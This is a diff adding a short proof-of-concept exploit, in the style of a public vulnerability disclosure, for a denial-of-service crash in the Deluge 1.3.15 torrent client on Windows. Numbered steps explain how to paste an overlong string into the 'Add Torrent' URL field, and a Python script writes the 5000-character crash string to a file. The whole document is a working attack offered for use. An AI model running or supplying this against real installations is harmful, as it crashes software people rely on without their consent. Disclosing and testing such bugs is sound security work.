@@ -1,0 +1,22 @@
+#Exploit Title: Deluge 1.3.15 - 'URL' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-20
+#Vendor Homepage: https://dev.deluge-torrent.org/
+#Software Link: http://download.deluge-torrent.org/windows/deluge-1.3.15-win32-py2.7.exe
+#Tested Version: 1.3.15
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: deluge_url.py
+#2.- Open deluge_url.txt and copy content to clipboard
+#3.- Open deluge.exe
+#4.- Select "File" > "Add Torrent" > "URL"
+#5.- In "From URL" field paste Clipboard
+#6.- Select "OK"
+#7.- Crashed
+
+cod = "\x41" * 5000
+
+f = open('deluge_url.txt', 'w')
+f.write(cod)
+f.close()
